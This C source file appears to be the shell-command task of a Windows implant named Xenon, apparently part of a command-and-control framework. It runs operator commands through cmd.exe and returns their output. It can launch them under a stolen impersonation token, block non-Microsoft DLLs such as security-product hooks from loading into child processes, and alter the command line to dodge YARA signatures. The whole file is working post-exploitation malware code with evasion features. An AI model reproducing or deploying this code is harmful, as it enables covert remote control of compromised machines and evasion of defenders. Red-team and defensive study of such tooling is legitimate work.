#include "Tasks/Shell.h"

#include <windows.h>
#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"
#include "Identity.h"
#include "Xenon.h"

/* ── Types / constants missing from older MinGW headers ─────────────────── */

#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000UL
#endif

/* ProcThreadAttributeMitigationPolicy=7, Input=TRUE → 0x00020007 */
#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007UL
#endif

/* Mirror of STARTUPINFOEXA / STARTUPINFOEXW — identical layout, avoids SDK dependency */
typedef struct { STARTUPINFOA StartupInfo; PVOID lpAttributeList; } XENON_SIEX_A;
typedef struct { STARTUPINFOW StartupInfo; PVOID lpAttributeList; } XENON_SIEX_W;

/* Dynamic function pointer types — required for PIC */
typedef BOOL (WINAPI* FN_InitProcAttrList)  (PVOID, DWORD, DWORD, PSIZE_T);
typedef BOOL (WINAPI* FN_UpdateProcAttr)    (PVOID, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef VOID (WINAPI* FN_DeleteProcAttrList)(PVOID);
typedef BOOL (WINAPI* FN_CreateProcAsUserW) (HANDLE, LPCWSTR, LPWSTR,
    LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
    BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

/* ─────────────────────────────────────────────────────────────────────────── */

#ifdef INCLUDE_CMD_SHELL

/**
 * @brief Execute a shell command using CreateProcessA and return the output.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T size     = 0;
    PCHAR cmd       = ParserGetString(arguments, &size);
    PPackage temp   = PackageInit(0, FALSE);

    HANDLE hStdOutRead      = NULL;
    HANDLE hStdOutWrite     = NULL;
    HANDLE hStdErrRead      = NULL;
    HANDLE hStdErrWrite     = NULL;
    XENON_SIEX_A            siex    = { 0 };
    XENON_SIEX_W            siexw   = { 0 };
    PROCESS_INFORMATION     pi      = { 0 };
    SECURITY_ATTRIBUTES     sa      = { 0 };

    PVOID    pAttrList      = NULL;
    SIZE_T   attrListSize   = 0;
    DWORD64  mitigationPolicy = 0x100000000000ULL; /* PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON */

    HMODULE hKernel32 = GetModuleHandleA("kernel32");
    HMODULE hAdvapi32 = GetModuleHandleA("advapi32");
    FN_InitProcAttrList   _InitProcAttrList   = (FN_InitProcAttrList)  GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
    FN_UpdateProcAttr     _UpdateProcAttr     = (FN_UpdateProcAttr)    GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
    FN_DeleteProcAttrList _DeleteProcAttrList = (FN_DeleteProcAttrList)GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
    FN_CreateProcAsUserW  _CreateProcAsUserW  = (FN_CreateProcAsUserW) GetProcAddress(hAdvapi32, "CreateProcessAsUserW");
    DWORD bytesRead         = 0;
    DWORD bytesAvailable    = 0;
    CHAR cmdLine[8192]      = { 0 };
    WCHAR cmdLineW[8192]    = { 0 };
    CHAR buffer[4096]       = { 0 };

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    /* Create anonymous pipes for stdout and stderr */
    if ( !CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0) )
    {
        DWORD error = GetLastError();
        _err("\t CreatePipe (stdout) failed: %d", error);
        PackageError(taskUuid, error);
        goto CLEANUP;
    }

    if ( !CreatePipe(&hStdErrRead, &hStdErrWrite, &sa, 0) )
    {
        DWORD error = GetLastError();
        _err("\t CreatePipe (stderr) failed: %d", error);
        PackageError(taskUuid, error);
        goto CLEANUP;
    }

    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0);

    siex.StartupInfo.cb       = sizeof(STARTUPINFOA);
    siex.StartupInfo.hStdOutput = hStdOutWrite;
    siex.StartupInfo.hStdError  = hStdErrWrite;
    siex.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;

    /* Build mitigation policy attribute list if blockDlls is enabled */
    if (xenonConfig->blockDlls && _InitProcAttrList && _UpdateProcAttr)
    {
        _InitProcAttrList(NULL, 1, 0, &attrListSize);
        pAttrList = HeapAlloc(GetProcessHeap(), 0, attrListSize);
        if (pAttrList)
        {
            _InitProcAttrList(pAttrList, 1, 0, &attrListSize);
            _UpdateProcAttr(pAttrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                &mitigationPolicy, sizeof(mitigationPolicy), NULL, NULL);
            siex.StartupInfo.cb  = sizeof(XENON_SIEX_A);
            siex.lpAttributeList = pAttrList;
        }
    }

    DWORD dwCreationFlags = CREATE_NO_WINDOW | (pAttrList ? EXTENDED_STARTUPINFO_PRESENT : 0);

    /* Construct command line: cmd.exe /c "user_command" */
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /d /c \"%s\"", cmd); // To avoid trivial yara rules

    /* Create the process - use stolen token if available */
    BOOL processCreated = FALSE;
    if ( gIdentityToken != NULL )
    {
        _dbg("\t Using impersonated token for process creation");
        
        /* Convert command line to wide characters for CreateProcessWithTokenW */
        if (MultiByteToWideChar(CP_ACP, 0, cmdLine, -1, cmdLineW, sizeof(cmdLineW) / sizeof(WCHAR)) == 0)
        {
            DWORD error = GetLastError();
            _err("\t Failed to convert command line to wide char: %d", error);
            PackageError(taskUuid, error);
            goto CLEANUP;
        }
        
        /* Setup wide character startup info */
        siexw.StartupInfo.cb        = pAttrList ? sizeof(XENON_SIEX_W) : sizeof(STARTUPINFOW);
        siexw.StartupInfo.hStdOutput = hStdOutWrite;
        siexw.StartupInfo.hStdError  = hStdErrWrite;
        siexw.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
        siexw.lpAttributeList        = pAttrList;

        /* CreateProcessAsUserW supports EXTENDED_STARTUPINFO_PRESENT; CreateProcessWithTokenW does not */
        processCreated = _CreateProcAsUserW(
            gIdentityToken,             // Token handle
            NULL,                       // Application name
            cmdLineW,                   // Command line (wide char)
            NULL,                       // Process security attributes
            NULL,                       // Thread security attributes
            TRUE,                       // Inherit handles
            dwCreationFlags,            // Creation flags
            NULL,                       // Environment
            NULL,                       // Current directory
            (LPSTARTUPINFOW)&siexw,     // Startup info
            &pi);                       // Process information
    }
    else
    {
        processCreated = CreateProcessA(
            NULL,                       // Application name
            cmdLine,                    // Command line
            NULL,                       // Process security attributes
            NULL,                       // Thread security attributes
            TRUE,                       // Inherit handles
            dwCreationFlags,            // Creation flags
            NULL,                       // Environment
            NULL,                       // Current directory
            (LPSTARTUPINFOA)&siex,      // Startup info
            &pi);                       // Process information
    }

    if ( !processCreated )
    {
        DWORD error = GetLastError();
        _err("\t Process creation failed: %d", error);
        PackageError(taskUuid, error);
        goto CLEANUP;
    }

    /* Close write handles in parent */
    CloseHandle(hStdOutWrite);
    CloseHandle(hStdErrWrite);
    hStdOutWrite = NULL;
    hStdErrWrite = NULL;

    CloseHandle(pi.hThread);
    pi.hThread = NULL;

    DWORD maxWaitTime   = 3000;
    DWORD startTime     = GetTickCount();
    BOOL hasReadAnyData = FALSE;

    /* Read stdout with timeout */
    while ( TRUE )
    {
        if ( PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvailable, NULL) )
        {
            if ( bytesAvailable > 0 )
            {
                hasReadAnyData = TRUE;
                
                if ( ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) )
                {
                    if (bytesRead > 0)
                    {
                        PackageAddBytes(temp, (PBYTE)buffer, bytesRead, FALSE);
                    }
                }
                
                continue;
            }
            else
            {
                if ( hasReadAnyData )
                {
                    DWORD exitCode = 0;
                    if ( pi.hProcess && GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE )
                    {
                        break;
                    }
                    if ( GetTickCount() - startTime > maxWaitTime )
                    {
                        break;
                    }
                    Sleep(50);
                    continue;
                }
                else
                {
                    if ( GetTickCount() - startTime > maxWaitTime )
                    {
                        break;
                    }
                    Sleep(50);
                    continue;
                }
            }
        }
        else
        {
            DWORD error = GetLastError();
            if ( error == ERROR_BROKEN_PIPE || error == ERROR_INVALID_HANDLE )
            {
                if ( ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0 )
                {
                    PackageAddBytes(temp, (PBYTE)buffer, bytesRead, FALSE);
                }
                break;
            }
            break;
        }
    }

    bytesAvailable = 0;
    if ( PeekNamedPipe(hStdErrRead, NULL, 0, NULL, &bytesAvailable, NULL) )
    {
        while ( bytesAvailable > 0 )
        {
            if ( ReadFile(hStdErrRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
            {
                PackageAddBytes(temp, (PBYTE)buffer, bytesRead, FALSE);
            }
            bytesAvailable = 0;
            PeekNamedPipe(hStdErrRead, NULL, 0, NULL, &bytesAvailable, NULL);
        }
    }


    // Success
    PackageComplete(taskUuid, temp);

CLEANUP:
    if (hStdOutRead) CloseHandle(hStdOutRead);
    if (hStdOutWrite) CloseHandle(hStdOutWrite);
    if (hStdErrRead) CloseHandle(hStdErrRead);
    if (hStdErrWrite) CloseHandle(hStdErrWrite);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);

    if (pAttrList && _DeleteProcAttrList)
    {
        _DeleteProcAttrList(pAttrList);
        HeapFree(GetProcessHeap(), 0, pAttrList);
    }

    PackageDestroy(temp);

    return;
}
#endif
